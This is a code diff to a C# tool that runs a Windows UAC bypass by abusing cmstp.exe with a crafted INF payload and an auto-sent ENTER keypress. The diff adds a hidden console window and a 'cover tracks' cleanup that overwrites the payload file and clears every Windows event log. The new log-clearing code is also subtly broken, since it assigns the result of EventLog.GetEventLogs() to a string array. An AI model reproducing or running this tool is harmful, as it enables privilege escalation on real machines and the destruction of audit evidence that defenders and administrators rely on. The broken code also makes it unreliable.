@@ -31,10 +31,12 @@ ShortSvcName=""CorpVPN""
 
 ";
 
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
 
-    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+    public const string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
     public static void Main(string[] args)
     {
@@ -50,13 +52,29 @@ ShortSvcName=""CorpVPN""
             return;
         }
 
-        KillCmstpProcess();
+        // Hide console window
+        IntPtr consoleWindow = GetConsoleWindow();
+        ShowWindow(consoleWindow, 0);
+
+        // Perform the kill operation first
+        ProcessStartInfo killStartInfo = new ProcessStartInfo("taskkill")
+        {
+            Arguments = "/IM cmstp.exe /F",
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+        Process.Start(killStartInfo);
 
         string infFilePath = SetInfFile(commandToExecute);
 
         Console.WriteLine("Payload file written to " + infFilePath);
 
-        StartCmstpProcess(infFilePath);
+        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
+        {
+            Arguments = "/au " + infFilePath,
+            UseShellExecute = false
+        };
+        Process.Start(cmstpStartInfo);
 
         IntPtr windowHandle = IntPtr.Zero;
         do
@@ -65,27 +83,9 @@ ShortSvcName=""CorpVPN""
         } while (windowHandle == IntPtr.Zero);
 
         System.Windows.Forms.SendKeys.SendWait("{ENTER}");
-    }
 
-    public static void KillCmstpProcess()
-    {
-        ProcessStartInfo startInfo = new ProcessStartInfo("taskkill")
-        {
-            Arguments = "/IM cmstp.exe /F",
-            UseShellExecute = false,
-            CreateNoWindow = true
-        };
-        Process.Start(startInfo)?.WaitForExit();
-    }
-
-    public static void StartCmstpProcess(string arguments)
-    {
-        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
-        {
-            Arguments = "/au " + arguments,
-            UseShellExecute = false
-        };
-        Process.Start(cmstpStartInfo)?.WaitForExit();
+        // Clean up and cover tracks
+        CleanUp(infFilePath);
     }
 
     public static IntPtr SetWindowActive(string processName)
@@ -102,11 +102,39 @@ ShortSvcName=""CorpVPN""
 
     public static string SetInfFile(string commandToExecute)
     {
-        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string temporaryDir = "C:\\windows\\temp";
-        string outputFile = Path.Combine(temporaryDir, $"{randomFileName}.inf");
-        string newInfData = InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute);
-        File.WriteAllText(outputFile, newInfData);
-        return outputFile;
+        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string TemporaryDir = "C:\\windows\\temp";
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append(TemporaryDir);
+        OutputFile.Append("\\");
+        OutputFile.Append(RandomFileName);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
     }
+
+    public static void CleanUp(string filePath)
+    {
+        // Securely delete the INF file
+        File.WriteAllText(filePath, new string(' ', 1024)); // Overwrite content with spaces
+        File.Delete(filePath);
+
+        // Remove evidence from the event logs
+        ClearEventLogs();
+    }
+
+    public static void ClearEventLogs()
+    {
+        string[] eventLogs = EventLog.GetEventLogs();
+        foreach (string log in eventLogs)
+        {
+            EventLog eventLog = new EventLog(log);
+            eventLog.Clear();
+        }
+    }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
 }
